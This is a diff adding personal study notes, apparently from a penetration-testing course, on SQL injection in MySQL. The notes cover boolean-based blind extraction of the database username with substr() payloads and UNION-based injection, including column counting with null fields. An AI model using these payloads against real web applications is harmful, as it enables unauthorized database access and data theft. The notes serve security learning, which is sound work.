@@ -183,6 +183,86 @@ sql statements
 
 			- MySQL functions: user() & substring()
 
+				- user() = returns the name of the user currently using the database 
+
+				mysql> select user(); 
+
+				- substring() = returns a substring of the given argument. Takes 3 parameters: input string, the position of the substring and length
+
+				mysql> select substring('elearnsecurity', 2, 1); 
+
+				- SQL allows you to test the output of a function in a True/False condition
+
+				mysql> select substring(user(), 1, 1) = 'r'; 
+				1 
+				// TRUE 
+
+				mysql> select substring(user(), 1, 1) = 'a'; 
+				0
+				// FALSE 
+
+
+				- iterate over the letters of the username by using payloads such as: 
+
+					' or substr(user(), 1, 1) = 'a
+					' or substr(user(), 1, 1) = 'b
+
+				- find the first letter move into the second 
+
+					' or substr(user(), 2, 1) = 'a
+					' or substr(user(), 2, 1) = 'b
+						- until entire username is found 
+
+
+				- in the image we know the first letter because the image appeared and know it is only shown on a TRUE condition
+				- impractical to extract username is impractical 
+
+
+	- UNION BASED SQL INJECTIONS 
+
+		- at timees the results of a query are directly displayed on the output page 
+
+		- can exploit with UNION SQL command 
+
+			SELECT description FROM items WHERE id='' UNION SELECT user(); -- -`; 
+
+			` UNION SELECT user(); -- - 
+
+				- payload forces the web application to display the result of user() function on the output page
+
+			; -- -; // prevents the part of the original query from being parsed by the database 
+				... -- -'; single quote remainder of the original query 
+
+
+		- EXPLOITING UNION SQL INJECTIONS 
+
+			- 1. need to know how many fields the vulnerable query selects by trial and error 
+
+			- 2. test the number of fields 
+				- id=' UNION SELECT null; -- -; 
+					- receive an error message 
+					- # of fields dont match the payload 
+
+				- id=' UNION SELECT null, null; -- -; 
+					- image appears meaning the condition is TRUE 
+
+				- id=' UNION SELECT null, null, null; -- -; 
+					- error message confirms that query just has two fields 
+
+			- 3. we know how many fields in the query -> test which fields are part of the output page 
+				- inject some known values and checking the results in the output page
+
+					Ex. 
+					' UNION SELECT 'elsid1', 'elsid2'; -- - 
+
+					Result: 
+					- only first field gets reflected to the output -> look at the source code 
+
+					- both the fields get displayed the output 
+
+			- 4. now exploit the injection by the use of user() 
+
+
 	
 
 
